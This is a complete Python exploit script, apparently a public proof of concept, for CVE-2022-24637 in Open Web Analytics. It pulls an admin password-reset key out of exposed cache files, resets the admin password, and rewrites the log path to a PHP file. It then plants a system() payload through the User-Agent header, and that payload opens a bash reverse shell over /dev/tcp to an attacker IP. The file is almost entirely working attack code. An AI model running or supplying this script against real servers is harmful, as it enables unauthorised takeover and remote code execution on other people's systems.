#!/usr/bin/env python3
# by 0xPThree - exploit.se
# based on https://devel0pment.de/?p=2494
from hashlib import md5
from colorama import Fore
import requests
import argparse
import re
import base64

r = requests.session()

def owaLogin(target, username, password):
    # Login to create cache file or get admin session
    url = target + "/index.php?owa_do=base.loginForm"
    payload = {
        "owa_user_id": username,
        "owa_password": password,
        "owa_go": target,
        "owa_action": "base.login",
        "owa_submit_btn": "Login"
    }
    req = r.post(url, data=payload)
    if "Login Failed!" in req.text:
        print(Fore.GREEN + "[+] generationg cache file")
    else:
        print(Fore.GREEN + "[+]", username, "login successful")


def getTempPassKey(target):
    # Calculate cache file name
    user_id = 1
    while (user_id < 10):
        unhashed_key = 'user_id' + str(user_id)
        cache_filename = md5(unhashed_key.encode()).hexdigest() + '.php'
        url = target + '/owa-data/caches/1/owa_user/' + cache_filename

        req = r.get(url)
        if req.status_code != 404:
            print("[+] admin cache found!")
            cache_content = req.text
            b64_blob = re.search(r'\*(.*?)\*', cache_content).group(1)
            byte_serialized_php = base64.b64decode(b64_blob)
            keys = re.findall("[a-f0-9]{32}", byte_serialized_php.decode('utf-8'))
            print("[+] extracted temp_passkey:", keys[0])
            return(keys[0])
        user_id = user_id + 1


def changePw(target, temp_passkey, password):
    # Change admin password
    url = target + "/index.php?owa_do=base.usersChangePassword"
    payload = {
        "owa_password": password,
        "owa_password2": password,
        "owa_k": temp_passkey,
        "owa_action": "base.usersChangePassword",
        "owa_submit_btn": "Save+Your+New+Password"
    }
    req = r.post(url, data=payload)
    print("[+] changed admin password to:", password)


def updateLog(target):
    # Update log to prepare for malicious payload
    url = target + "/index.php?owa_do=base.optionsGeneral"
    get_data = r.get(url).text
    nonce = re.search(r'\"owa_nonce\" value\=\"(.*?)\"\>', get_data).group(1)
    log_dir = re.search(r'\"owa_config\[base.async_log_dir\]\" value\=\"(.*?)\"\>', get_data).group(1) 
    print(Fore.GREEN + "[+] extracted nonce:", nonce)
    print("[+] extracted log_dir:", log_dir)

    payload = {
        "owa_config[base.error_log_level]": "2",
        "owa_config[base.error_log_file]": log_dir + "rev.php",
        "owa_nonce": nonce,
        "owa_action": "base.optionsUpdate",
        "owa_module": "base"
    }
    r.post(url, data=payload)
    print("[+] updated log settings")
    return(log_dir)


def getReverse(target, log_dir):
    url_end = re.search(r'/var/www/html/owa(.*)', log_dir).group(1) + "rev.php"
    rce_url = target + url_end
    reverse = """<?php system("bash -c 'exec bash -i &>/dev/tcp/10.10.14.2/4488 <&1'"); ?>"""   # change this

    # write payload to log
    r.get(target, headers={"User-Agent": reverse})
    print("[+] wrote payload to file:", rce_url)

    # trigger payload
    print(Fore.CYAN + "[>] triggering payload")
    r.get(rce_url).text


def printArt():
    print(Fore.RED + "")
    print("   ______     _______     ____   ___ ____  ____      ____  _  _    __  __________ ")
    print("  / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ \| || |  / /_|___ /___  |")
    print(" | |    \ \ / /|  _| _____ __) | | | |__) | __) |____ __) | || |_| '_ \ |_ \  / / ")
    print(" | |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____/ __/|__   _| (_) |__) |/ /  ")
    print("  \____|  \_/  |_____|   |_____|\___/_____|_____|   |_____|  |_|  \___/____//_/   ")
    print("\t\t\t\t\t\t\tby 0xPThree - exploit.se\n\n")
                                                                                  

def main():
    formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=70)
    parser = argparse.ArgumentParser(formatter_class=formatter)
    parser.add_argument('-t','--target', type=str, help='target url')
    parser.add_argument('-u','--username', type=str, help='owa username')
    parser.add_argument('-p','--password', type=str, help='owa password')
    args = parser.parse_args()

    printArt()
    print(Fore.CYAN + "[>] PART 1: SINGLE / DOUBLE QUOTE CONFUSION")
    owaLogin(args.target, args.username, args.password)             # create cache file
    temp_passkey = getTempPassKey(args.target)                      # extract temp_passkey
    changePw(args.target, temp_passkey, args.password)              # change user password
    owaLogin(args.target, args.username, args.password)             # login as user

    print(Fore.CYAN + "\n[>] PART 2: PHP FILE WRITE")
    log_dir = updateLog(args.target)                                # update log settings
    getReverse(args.target, log_dir)                                # trigger reverse shell     
    
    
if __name__ == "__main__":
    main()
